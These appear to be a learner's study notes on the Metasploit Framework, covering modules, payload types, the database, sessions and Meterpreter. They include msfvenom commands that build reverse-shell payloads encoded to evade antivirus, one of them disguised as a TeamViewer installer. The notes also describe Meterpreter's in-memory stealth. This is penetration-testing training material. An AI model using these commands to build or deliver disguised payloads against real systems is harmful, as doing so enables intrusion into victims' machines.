![metasploit](https://academy.hackthebox.com/storage/modules/39/S02_SS01.png)

*Metasplit files located at* `/usr/share/metasploit-framework`

**Install Metasploit Framework**

    sudo apt update && sudo apt install metasploit-framework

**Start the METASPLOIT FRAMEWORK**

    msfconsole

`-q` - to not display the banner

`msfupdate` - to update the metasploit framework

![MSF Engagment Structure](https://academy.hackthebox.com/storage/modules/39/S04_SS03.png)


## Modules

    <No.> <type>/<os>/<service>/<name>

- `<No.>` - it is usefull to select the modules after the search.

- `<type>` - this tells the piece of code for this module what will accomplish

|**Type**|	**Description**|
|-|-|
|`Auxiliary`|	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
|`Encoders`|	Ensure that payloads are intact to their destination.
|`Exploits`|	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
|`NOPs`|	(No Operation code) Keep the payload sizes consistent across exploit attempts.
|`Payloads`|	Code runs remotely and calls back to the attacker machine to establish a connection (or shell).
|`Plugins`|	Additional scripts can be integrated within an assessment with msfconsole and coexist.
|`Post`|	Wide array of modules to gather information, pivot deeper, etc.

- `<os>`  - specifies which operating system and architecture the module was created for

- `<services>` - the vulnerable service that is running on the target machine

- `<name>` - the actual action that can be performed using this module created for a specific purpose.

**Specific Search**

    search type:exploit platform:windows cve:2021 rank:excellent microsoft

`set` - this tag is use to set values only for local or specific module

`setg` this is use to set for all modules until the user exit the msfconsole.

## Target 
it shows the current module is vulnable to with versions 

    show target

# Payloads
A Payload in Metasploit refers to a module that aids the exploit module in returning a shell to the attacker.
## Type of payloads
1. Single
- it contain everything all-in-one

2. Satgers
- it is waiting at the atcker machine ready to establish a connection to the victim host
- this is used to setup connection between attacker and victim .
- designed to be small and reliable. 

3. Stages
- Stages are payload components that are downloaded by stager's modules.
- it provide advance feature with no size limit.
- use middle stager automatically.


# Encoders

Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. Encoders come into play with the role of changing the payload to run on different operating systems and architectures.

**Create payload with Encoder** (before 2015)

    msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

**Creating payload** (After 2015)

    without encoding
    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

    with encodig
    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

`-a` - architecture
`--plateform` - plateform
`-p` - payload
`LHOST` - ip to connnect back
`lPORT` - victim connect to the port.
`-b` - 
`-e` - encoding

it is hard to escape the antivirus now a day and SGN is also recoginagable amongs all the antivirus.
better to use the multi level encoding into the payload.

    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

`-i <number>` - this helps to iterrate the same encoded payload to the number of tines.

# Database
*Msfconsole has built-in support for the PostgreSQL database system.*

initiate the databse in MSF

    sudo msfdb init

connect to the init DB

    sudo msfdb run

show status of the DB

    sudo msfdb status

Reinitiate the Database

    msfdb reinit
    cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
    sudo service postgresql restart
    msfconsole -q

**workspace** `workspace -h`

    workspace -a/-d <workspace_name>

- `-a` - to create the workspace
- `-d` - to delete the workspace


**import nmap Scan to metasploit**

    db_import targer.xml

`db_export -h` - open the help option to export the DB of metasploit.
`host -h` - MSF - Stored Hosts
`service -h` - MSF - Stored Services of Hosts
`cred -h` - MSF - Stored Credentials
`loot -h` -  The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.

# Plugins
Plugins are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework

Plugins are stored at `/usr/share/metasploit-framework/plugins`

**load plugins**

    load <plugin_name>

**Installing new Plugins**

- download the plugin file to the local machine.
- move the file to the `/usr/share/metasploit-framework/plugins` directory.
- load the plugin by its name in MSF

**Mixins** - *Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes*

# Sessions
*This is specifically useful when we want to run an additional module on an already exploited system with a formed, stable communication channel.*

**background** -  `CTRL +Z` or `bacground`
**Sessions** - `sessions`
**interact with the session** - `sessions -i [no.]`

# JOB
`exploit -j` - run the exploit as a job
`job -l` - see the list of job.
`kill <id>` - kill specific job
`job -K` kill all running job


# MetaPreter 

Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect

To run Meterpreter, we only need `payload` and `OS` we are attacking.

When the exploit is completed, the following events occur:

- The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.

- The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.

- The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.

- Lastly, Meterpreter loads extensions. It will always load stdapi and load priv if the module gives administrative rights. All of these extensions are loaded over AES encryption.

Meterpreter needs to be:
1. Stealthy (After ariving to the target)
- Resides entirely in memory and writes nothing to the disk.
- No new processes are created 
- move itself to the compromised process or it can perform process migrations from one running process to another.

2. Powerfull
- Use of a channelized communication system between the target host and the attacker.
- Spawn a host-OS shell inside of our Meterpreter stage by opening a dedicated channel for it.

3. Extensible
- augmented at runtime and loaded over the network.
- allows new functionality to be added without rebuilding it



# Importing new modules to the metasploit
`/usr/share/metasploit-framework/` - dir we use to move the file 
`~/.msf4/` = root folder for the Metasploit 

*Download the file*

cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb // copy yhe file to the MSF dir.

## MSF - Loading Additional Modules at Runtime

    msfconsole -m /usr/share/metasploit-framework/modules/  // this will load the dir file at runtime.

## msfconsole -m /usr/share/metasploit-framework/modules/

    msf6> loadpath /usr/share/metasploit-framework/modules/ #  lead the file after runing  the MFS.

    msf6 > reload_all
